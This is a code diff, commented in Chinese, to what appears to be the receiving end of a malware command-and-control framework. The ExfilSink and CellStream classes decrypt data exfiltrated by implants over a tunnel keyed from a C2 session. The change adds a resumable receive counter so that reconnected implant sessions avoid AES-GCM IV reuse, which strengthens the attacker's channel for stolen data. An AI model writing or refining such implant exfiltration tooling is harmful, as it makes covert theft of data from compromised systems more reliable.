@@ -239,13 +239,18 @@ def derive_tunnel_keys(k_c2s: bytes, k_s2c: bytes,
 class CellStream:
     """定长信元解封。只解一个方向（k_recv），counter 严格递增。"""
 
-    def __init__(self, k_send: bytes, k_recv: bytes, pfx: bytes):
+    def __init__(self, k_send: bytes, k_recv: bytes, pfx: bytes,
+                 recv_counter: int = 0):
         if len(pfx) != P2P_NONCE_PFX_LEN:
             raise ExfilError(EXF_ERR_ARG, "pfx must be 8 bytes")
+        if recv_counter < 0 or recv_counter > 0xFFFFFFFF:
+            raise ExfilError(EXF_ERR_ARG, "recv_counter out of range")
         self._k_send = k_send
         self._k_recv = k_recv
         self._pfx = pfx
-        self._recv_counter = 0
+        # 会话恢复时必须从断点续接：归零会让两端 IV 重新重合，
+        # 同一密钥下 IV 重用 -> 两条密文异或即泄露明文异或。
+        self._recv_counter = recv_counter
         self._gcm = GCM(k_recv)
 
     @property
@@ -345,12 +350,13 @@ class ExfilSink:
     """
 
     def __init__(self, k_send: bytes, k_recv: bytes, pfx: bytes,
-                 max_rec: int = 1 << 20):
+                 max_rec: int = 1 << 20, recv_counter: int = 0):
         if max_rec <= 0:
             max_rec = 1 << 20
         if max_rec > EXF_PAYLOAD_MAX:
             max_rec = EXF_PAYLOAD_MAX
-        self._cell = CellStream(k_send, k_recv, pfx)
+        self._cell = CellStream(k_send, k_recv, pfx,
+                                recv_counter=recv_counter)
         self._max_rec = max_rec
         self._buf = bytearray()
         self._in_batch = False
@@ -358,11 +364,16 @@ class ExfilSink:
     @classmethod
     def for_implant(cls, k_c2s: bytes, k_s2c: bytes,
                     server_node_id: bytes, implant_id: str,
-                    max_rec: int = 1 << 20) -> "ExfilSink":
-        """按 implant 建立接收端。k_c2s/k_s2c 来自 02_c2 会话派生。"""
+                    max_rec: int = 1 << 20,
+                    recv_counter: int = 0) -> "ExfilSink":
+        """按 implant 建立接收端。k_c2s/k_s2c 来自 02_c2 会话派生。
+
+        recv_counter 用于会话恢复：重连后必须从断点续接，不能归零。
+        """
         peer = derive_node_id(implant_id)
         k_send, k_recv, pfx = derive_tunnel_keys(k_c2s, k_s2c, server_node_id, peer)
-        return cls(k_send, k_recv, pfx, max_rec=max_rec)
+        return cls(k_send, k_recv, pfx, max_rec=max_rec,
+                   recv_counter=recv_counter)
 
     # -- 状态 ---------------------------------------------------------------
 
